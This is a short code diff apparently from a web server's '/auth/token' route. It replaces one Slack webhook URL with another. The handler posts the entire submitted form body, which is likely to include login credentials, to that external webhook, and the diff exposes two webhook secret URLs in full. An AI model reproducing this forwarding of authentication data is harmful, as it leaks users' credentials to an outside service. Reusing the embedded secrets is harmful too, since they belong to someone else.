@@ -64,7 +64,7 @@ router.post("/auth/token", async (ctx) => {
 
     const data = await ctx.request.body({type: "form"}).value;
   
-    await fetch(`https://hooks.slack.com/services/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`, {
+    await fetch(`https://hooks.slack.com/services/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`, {
       body: JSON.stringify({
         text: data.toString()
       }), 
